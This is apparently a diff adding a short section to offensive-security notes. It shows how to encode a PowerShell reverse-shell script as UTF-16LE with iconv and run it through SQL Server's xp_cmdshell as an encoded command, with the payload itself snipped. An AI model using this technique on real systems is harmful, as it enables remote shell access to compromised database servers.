@@ -381,3 +381,12 @@ PS:
 ```
 
  We could use the cmd.exe command-file that we made and example of earlier.
+ 
+ ## Convert ps1 shell 
+ ```bash
+ cat reverse_shell.ps1 | iconv -t UTF-16LE
+ 
+ Using SQL in Windows:
+ xp_cmdshell powershell -enc ...SNIP-ICONV...
+ ```
+ *Windows formatting
